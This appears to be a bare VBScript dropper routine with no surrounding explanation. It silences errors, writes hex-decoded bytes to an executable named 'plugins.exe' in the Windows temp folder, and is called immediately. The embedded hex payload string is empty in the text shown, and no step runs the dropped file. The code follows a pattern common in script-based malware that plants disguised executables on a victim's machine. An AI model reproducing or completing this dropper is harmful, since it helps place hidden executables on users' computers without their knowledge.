Sub ekstrak
On Error Resume Next
Dim isi
isi = ""
Set cfldr = CreateObject("scripting.filesystemobject")
fldr = cfldr.getspecialfolder(2)
Set ts = CreateObject("Scripting.FileSystemObject").OpenTextFile(fldr & "\plugins.exe", 2, True)
For x = 1 To Len(isi) Step 2
ts.Write Chr(CLng("&H" & Mid(isi, x, 2)))
Next
ts.Close
End Sub
ekstrak
